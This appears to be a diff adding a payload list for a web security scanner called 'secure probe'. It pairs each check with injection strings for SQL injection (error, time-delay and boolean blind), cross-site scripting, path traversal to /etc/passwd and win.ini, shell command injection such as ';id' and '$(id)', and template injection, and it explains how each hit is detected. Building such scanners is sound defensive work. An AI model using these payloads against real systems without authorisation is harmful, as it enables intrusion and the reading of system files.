@@ -1,0 +1,58 @@
+# Payloads for `secure probe`. Format: <check><TAB><payload>. Lines starting with "# " are comments.
+# Every payload is non-destructive: it reads, delays or reflects; it never writes or deletes.
+#
+# Checks and how a hit is decided (see AttackProbe / devtools.js):
+#   sqli-error   response contains a database error message
+#   sqli-time    response is >= 2.5 s slower than the baseline (payloads sleep 3 s)
+#   sqli-true    paired with sqli-false: a hit when the two responses differ while the "false" one
+#   sqli-false   still differs from the baseline (boolean-based blind injection)
+#   xss          the payload comes back unencoded in the response body
+#   path         the response contains /etc/passwd or win.ini content
+#   cmd          the response contains `id` command output
+#   cmd-time     response is >= 2.5 s slower than the baseline
+#   ssti         the response contains 94011 (= 31337*3) that the baseline did not
+
+sqli-error	'
+sqli-error	"
+sqli-error	1'
+sqli-error	')
+sqli-error	1' AND 1=CAST((SELECT version()) AS int)--
+sqli-error	1 AND 1=CAST((SELECT version()) AS int)
+sqli-error	1';DO $$BEGIN RAISE EXCEPTION 'secprobe'; END$$;--
+sqli-error	1 AND 1=CONVERT(int,@@version)--
+sqli-error	1 AND extractvalue(1,concat(0x7e,version()))
+sqli-time	1;SELECT pg_sleep(3)--
+sqli-time	1';SELECT pg_sleep(3)--
+sqli-time	1 OR (SELECT 1 FROM pg_sleep(3)) IS NOT NULL
+sqli-time	1' OR (SELECT 1 FROM pg_sleep(3)) IS NOT NULL--
+sqli-time	1 AND SLEEP(3)
+sqli-time	1' AND SLEEP(3)-- -
+sqli-time	1; WAITFOR DELAY '0:0:3'--
+sqli-time	1'; WAITFOR DELAY '0:0:3'--
+sqli-true	1 OR 1=1
+sqli-false	1 AND 1=2
+sqli-true	1' OR '1'='1
+sqli-false	1' AND '1'='2
+xss	<script>alert(31337)</script>
+xss	"><img src=x onerror=alert(31337)>
+xss	'"><svg/onload=alert(31337)>
+xss	javascript:alert(31337)//
+path	../../../../../../../../etc/passwd
+path	..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+path	....//....//....//....//....//....//etc/passwd
+path	/etc/passwd
+path	..\..\..\..\..\..\..\..\windows\win.ini
+path	C:\Windows\win.ini
+cmd	;id
+cmd	|id
+cmd	$(id)
+cmd	`id`
+cmd	&& id
+cmd-time	;sleep 3
+cmd-time	|sleep 3
+cmd-time	$(sleep 3)
+cmd-time	& ping -n 4 127.0.0.1 &
+ssti	{{31337*3}}
+ssti	${31337*3}
+ssti	<%= 31337*3 %>
+ssti	#{31337*3}
